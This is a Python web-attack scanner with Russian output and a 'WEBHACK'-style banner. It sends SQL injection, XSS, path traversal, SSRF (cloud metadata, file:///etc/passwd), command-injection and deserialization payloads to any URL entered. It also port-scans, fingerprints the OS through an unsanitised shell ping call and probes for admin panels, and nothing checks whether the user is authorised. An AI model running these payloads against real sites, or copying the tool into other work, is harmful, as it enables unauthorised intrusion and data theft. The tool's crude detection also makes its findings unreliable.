import concurrent.futures
import os
import re
import socket
import subprocess
from datetime import datetime
from urllib.parse import urlparse

import requests
from bs4 import BeautifulSoup
from pystyle import Center, Colorate, Colors

#
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
TIMEOUT = 7
THREADS = 10


def get_server_info(url):
    try:
        server_info = []
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        response = requests.get(
            base_url, headers={"User-Agent": USER_AGENT}, timeout=TIMEOUT
        )
        main_html = response.text
        headers = response.headers

        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as master_executor:
            # Секция 1: Сканирование портов
            ports_future = master_executor.submit(
                lambda: [
                    f"Порт {p} открыт"
                    for p in [21, 22, 80, 443, 8080, 8443, 3306, 3389, 5432, 27017]
                    if socket.socket().connect_ex((hostname, p)) == 0
                ]
            )

            # cекция 2: Анализ ОС
            os_future = master_executor.submit(
                lambda: (
                    (
                        ttl := int(
                            re.search(
                                r"ttl=(\d+)",
                                subprocess.check_output(
                                    f"ping -c 1 {hostname}",
                                    shell=True,
                                    stderr=subprocess.DEVNULL,
                                    text=True,
                                ),
                            ).group(1)
                        )
                    ),
                    [
                        f"OS: {'Windows' if ttl <= 128 else 'Linux/Unix' if ttl <= 64 else 'BSD'} (TTL={ttl})"
                    ],
                )[1]
                if "ttl=" in subprocess.getoutput(f"ping -c 1 {hostname}")
                else []
            )

            # Секция  Технологии еще добавить нада
            tech_future = master_executor.submit(
                lambda: list(
                    {
                        *[
                            tech
                            for tech, pattern in {
                                "WordPress": r"wp-(content|includes|admin)",
                                "Joomla": r"joomla",
                                "Drupal": r"sites/(all|default)/",
                                "React": r"__NEXT_DATA__",
                                "Angular": r"ng-|angular",
                                "jQuery": r"jquery(.min)?.js",
                                "Cloudflare": r"cf-ray|cloudflare",
                                "Bootstrap": r"bootstrap(.min)?.css",
                            }.items()
                            if re.search(pattern, main_html, re.I)
                        ],
                        *[
                            headers.get(h)
                            for h in ["X-Powered-By", "Server"]
                            if headers.get(h)
                        ],
                        *[
                            tech
                            for path, tech in {
                                "/package.json": "Node.js",
                                "/composer.json": "PHP",
                                "/Gemfile": "Ruby",
                                "/wp-admin": "WordPress",
                            }.items()
                            if requests.get(f"{base_url}{path}", timeout=2).status_code
                            == 200
                        ],
                    }
                )
            )

            for future in concurrent.futures.as_completed(
                [ports_future, os_future, tech_future]
            ):
                server_info.extend(future.result())

        return (
            [
                *[f"≡≡ {item} ≡≡" for item in ports_future.result()],
                *[f"≡≡ {item} ≡≡" for item in os_future.result()],
                *[f"≡≡ Технология: {tech} ≡≡" for tech in tech_future.result() if tech],
                *[
                    f"≡≡ {headers.get(h)} ≡≡"
                    for h in ["Server", "X-Powered-By"]
                    if headers.get(h)
                ],
            ]
            if any(server_info)
            else ["≡≡ Серверной информации не найденно ≡≡"]
        )

    except Exception as e:
        return [f"≡≡ Ошибка: {str(e)[:50]} ≡≡"]


def scan_sql_injection(url):
    payloads = [
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1--",
        '" OR 1=1--',
        "' UNION SELECT null,version()--",
        "1' ORDER BY 1--",
        "1' AND 1=CONVERT(int,@@version)--",
    ]
    results = []
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            headers = {"User-Agent": USER_AGENT}
            response = requests.get(test_url, headers=headers, timeout=TIMEOUT)

            error_patterns = [
                "SQL syntax",
                "MySQL server",
                "ORA-",
                "PostgreSQL",
                "syntax error",
                "unclosed quotation",
                "JDBC error",
            ]

            if any(
                pattern.lower() in response.text.lower() for pattern in error_patterns
            ):
                results.append(f"SQLi detected with payload: {payload}")

        except requests.RequestException as e:
            print(f"Request error: {e}")
            continue

    return results if results else ["SQL-инъекции не обнаружены"]


def scan_xss(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
    ]
    results = []
    for payload in payloads:
        test_url = f"{url}?test={payload}"
        try:
            response = requests.get(test_url, timeout=TIMEOUT)
            if payload in response.text:
                results.append(f"Reflected XSS with payload: {payload}")

            # Проверка DOM XSS
            if "<script>" in response.text and payload in response.text:
                results.append(f"Possible DOM XSS with payload: {payload}")

        except Exception:
            continue

    return results if results else ["XSS не обнаружена"]


def scan_directory_traversal(url):
    payloads = [
        "../../../../etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//etc/passwd",
    ]
    results = []
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url, timeout=TIMEOUT)
            if "root:" in response.text:
                results.append(f"Directory Traversal with payload: {payload}")
        except Exception:
            continue

    return results if results else ["Directory Traversal не обнаружен"]


def scan_ssrf(url):
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://localhost:8080",
    ]
    results = []
    for payload in payloads:
        try:
            test_url = f"{url}?url={payload}"
            response = requests.get(test_url, timeout=TIMEOUT)

            if "AMI ID" in response.text or "root:" in response.text:
                results.append(f"Possible SSRF with payload: {payload}")

        except Exception:
            continue

    return results if results else ["SSRF не обнаружены"]


def scan_rce(url):
    payloads = [";id;", "|id", "`id`", "$(id)", "|| id", "&& id"]
    results = []
    for payload in payloads:
        test_url = f"{url}?cmd={payload}"
        try:
            response = requests.get(test_url, timeout=TIMEOUT)
            if "uid=" in response.text or "gid=" in response.text:
                results.append(f"Possible RCE with payload: {payload}")
        except Exception:
            continue

    return results if results else ["RCE не обнаружены"]


def scan_deserialization(url):
    payloads = [
        '{"@type":"java.net.Inet4Address","val":"attacker.com"}',
        'O:8:"stdClass":1:{s:5:"value";s:3:"100";}',
    ]
    results = []
    for payload in payloads:
        try:
            headers = {"Content-Type": "application/json"}
            response = requests.post(
                url, data=payload, headers=headers, timeout=TIMEOUT
            )

            if "attacker.com" in response.text or "stdClass" in response.text:
                results.append("Possible deserialization vulnerability")

        except Exception:
            continue

    return results if results else ["Уязвимости десериализации не обнаружены"]


def scan_csrf(url):
    try:
        response = requests.get(url, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, "html.parser")

        forms = soup.find_all("form")
        csrf_vuln = []

        for form in forms:
            if not form.find("input", {"name": "csrf_token"}):
                action = form.get("action", "")
                method = form.get("method", "get").upper()
                csrf_vuln.append(f"Missing CSRF token in {method} form: {action}")

        return csrf_vuln if csrf_vuln else ["CSRF protection present"]

    except Exception:
        return ["Не удалось проверить CSRF"]


def find_admin_panels(url):
    common_paths = [
        "admin",
        "admin/login",
        "adminpanel",
        "wp-admin",
        "administrator",
        "login",
        "panel",
        "cpanel",
        "backend",
        "manager",
        "dashboard",
        "controlpanel",
        "webadmin",
        "adminarea",
        "sysadmin",
        "phpmyadmin",
    ]
    results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        for path in common_paths:
            test_url = f"{url}/{path}"
            futures.append(executor.submit(check_admin_panel, test_url))

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                results.append(result)

    return results if results else ["Админ-панели не найдены"]


def check_admin_panel(url):
    try:
        headers = {"User-Agent": USER_AGENT}
        response = requests.get(url, headers=headers, timeout=TIMEOUT)

        if response.status_code == 200:
            if (
                "login" in response.text.lower()
                or "admin" in response.text.lower()
                or "password" in response.text.lower()
            ):
                return url

    except Exception:
        return None


def scan_forms(url):
    try:
        headers = {"User-Agent": USER_AGENT}
        response = requests.get(url, headers=headers, timeout=TIMEOUT)
        soup = BeautifulSoup(response.text, "html.parser")

        forms = soup.find_all("form")
        results = []

        for i, form in enumerate(forms, 1):
            form_info = {
                "method": form.get("method", "GET").upper(),
                "action": form.get("action", url),
                "inputs": [],
            }

            for input_tag in form.find_all("input"):
                form_info["inputs"].append(
                    {
                        "name": input_tag.get("name", "no_name"),
                        "type": input_tag.get("type", "text"),
                        "value": input_tag.get("value", ""),
                    }
                )

            results.append(form_info)

        return results if results else ["Формы не найдены"]

    except Exception:
        return ["Не удалось проанализировать формы"]


def scan_headers(url):
    try:
        response = requests.get(url, timeout=TIMEOUT)
        headers = response.headers

        security_issues = []

        # Проверка security headers
        if "X-XSS-Protection" not in headers:
            security_issues.append("Missing X-XSS-Protection header")

        if "Content-Security-Policy" not in headers:
            security_issues.append("Missing Content-Security-Policy header")

        if "X-Frame-Options" not in headers:
            security_issues.append("Missing X-Frame-Options header")

        if "Strict-Transport-Security" not in headers:
            security_issues.append("Missing HSTS header")

        return security_issues if security_issues else ["Security headers в порядке"]

    except Exception:
        return ["Не удалось проверить заголовки"]


def get_user_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        print(f"Ошибка при получении IP-адреса: {e}")
        return "Не удалось получить IP"


def get_current_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def print_banner():
    os.system("cls" if os.name == "nt" else "clear")

    banner1 = """

╭────────────────────────────────────────────────────────────────────────────────────────────╮
│                                                                                            │
│   ▄█     █▄     ▄████████ ▀█████████▄     ▄█    █▄       ▄████████  ▄████████    ▄█   ▄█▄  │
│  ███     ███   ███    ███   ███    ███   ███    ███     ███    ███ ███    ███   ███ ▄███▀  │
│  ███     ███   ███    █▀    ███    ███   ███    ███     ███    ███ ███    █▀    ███▐██▀    │
│  ███     ███  ▄███▄▄▄      ▄███▄▄▄██▀   ▄███▄▄▄▄███▄▄   ███    ███ ███         ▄█████▀     │
│  ███     ███ ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ▀▀███▀▀▀▀███▀  ▀███████████ ███        ▀▀█████▄     │
│  ███     ███   ███    █▄    ███    ██▄   ███    ███     ███    ███ ███    █▄    ███▐██▄    │
│  ███ ▄█▄ ███   ███    ███   ███    ███   ███    ███     ███    ███ ███    ███   ███ ▀███▄  │
│   ▀███▀███▀    ██████████ ▄█████████▀    ███    █▀      ███    █▀  ████████▀    ███   ▀█▀  │
│                                                                                 ▀          │
│                                                                                            │
│        [●] Coder: @vedmood                                                                 │
│        [●] Для возврата напишите 99                                                        │
│                                                                                            │
╰────────────────────────────────────────────────────────────────────────────────────────────╯

    """

    print(Colorate.Horizontal(Colors.blue_to_purple, Center.XCenter(banner1)))


def main():
    print_banner()

    print("[+] Введите URL (например: http://example.com)")

    target_url = input("> ").strip()
    if target_url == "99":
        os.system("python main.py")

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    print(f"\n[+] Тестируем {target_url}\n")

    tests = {
        "SQL Injection": scan_sql_injection,
        "XSS": scan_xss,
        "Directory Traversal": scan_directory_traversal,
        "SSRF": scan_ssrf,
        "RCE": scan_rce,
        "Deserialization": scan_deserialization,
        "CSRF": scan_csrf,
        "Admin Panels": find_admin_panels,
        "Forms": scan_forms,
        "Security Headers": scan_headers,
    }

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(func, target_url): name for name, func in tests.items()
        }

        for future in concurrent.futures.as_completed(futures):
            test_name = futures[future]

            try:
                result = future.result()
                print(f"\n[+] {test_name}:")

                if isinstance(result, list):
                    for item in result:
                        print(f"  - {item}")
                else:
                    print(f"  - {result}")

            except Exception as e:
                print(f"\n[-] Ошибка при выполнении {test_name}: {str(e)}")

    print("[+] Анализ серверной архитектуры:")
    server_data = get_server_info(target_url)
    for item in server_data:
        print(item)


if __name__ == "__main__":
    main()
